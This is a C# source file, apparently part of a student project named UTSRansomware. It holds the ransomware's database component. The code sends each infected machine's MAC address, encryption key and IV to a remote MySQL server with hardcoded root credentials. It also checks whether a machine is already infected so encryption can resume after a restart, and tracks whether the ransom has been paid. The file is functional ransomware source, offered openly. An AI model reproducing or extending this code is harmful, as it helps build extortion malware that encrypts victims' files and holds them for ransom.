using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MySql.Data.MySqlClient;
using System.Net.NetworkInformation;

namespace UTSRansomware
{
    // Static class to manage SQL functionality
    internal static class SQLManager
{
        private static string connectionString = "Server=192.168.50.126;Database=ransomware;User ID=root;Password=1234;";

        public static MySqlConnection GetConnection()
        {
            return new MySqlConnection(connectionString);
        }

        // Adds a computer to SQL table
        public static void AddComputer(byte[] key, byte[] iv)
        {
            string convertedKey = Convert.ToBase64String(key);
            string convertedIV = Convert.ToBase64String(iv);
            using (MySqlConnection connection = GetConnection())
            {
                connection.Open();

                string query = "INSERT INTO infected_computers (computer_id, encryption_key, iv, ransom_payed) VALUES (@ComputerId, @Key, @Iv, @RansomPayed)";
                using (MySqlCommand cmd = new MySqlCommand(query, connection))
                {
                    cmd.Parameters.AddWithValue("@ComputerId", GetMACAddress());
                    cmd.Parameters.AddWithValue("@Key", convertedKey);
                    cmd.Parameters.AddWithValue("@Iv", convertedIV);
                    cmd.Parameters.AddWithValue("@RansomPayed", false);

                    cmd.ExecuteNonQuery();
                    Console.WriteLine("Computer added to DB");
                }
            }
        }

        /*
         * Checks if a computer is already infected
         * Checked on program startup in the case of someone 
         * killing ransomware process or restarting computer
        */
        public static bool ComputerInfected()
        {
            using (MySqlConnection connection = new MySqlConnection(connectionString))
            {
                connection.Open();

                // Define the query
                string query = "SELECT COUNT(*) FROM infected_computers WHERE computer_id = @computerId";
                using (MySqlCommand cmd = new MySqlCommand(query, connection))
                {
                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress());
                    int count = Convert.ToInt32(cmd.ExecuteScalar());

                    // If count is greater than 0, then the computer exists in the table
                    return count > 0;
                }
            }
        }

        // Removes a computer from SQL DB
        public static void RemoveComputer()
        {
            using (MySqlConnection connection = new MySqlConnection(connectionString))
            {
                connection.Open();

                // Define the query
                string query = "DELETE FROM infected_computers WHERE computer_id = @computerId";
                using (MySqlCommand cmd = new MySqlCommand(query, connection))
                {
                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress());
                    cmd.ExecuteNonQuery();
                    Console.WriteLine("Computer removed from DB");
                }
            }
        }

        // Gets MAC address for computer, used as primary key in SQL DB
        public static string GetMACAddress()
        {
            // Loop over all installed NIC
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Only use Ethernet NIC ignore Loopback etc
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet && nic.OperationalStatus == OperationalStatus.Up)
                {
                    string MACAddress = nic.GetPhysicalAddress().ToString();
                    Console.WriteLine($"Got MAC Address: {MACAddress}");
                    return MACAddress;
                }
            }
            return String.Empty;
        }

        // Checks SQL server to see if ransom has been paid for current computer
        public static bool IsRansomPaid()
        {
            using (MySqlConnection connection = new MySqlConnection(connectionString))
            {
                connection.Open();

                string query = "SELECT ransom_payed FROM infected_computers WHERE computer_id = @computerId";
                using (MySqlCommand cmd = new MySqlCommand(query, connection))
                {
                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress());
                    object result = cmd.ExecuteScalar();

                    if (result != null)
                    {
                        // Convert the result to boolean and return
                        return Convert.ToBoolean(result);
                    }
                    else
                    {
                        return false;
                    }
                }
            }
        }

    }
}
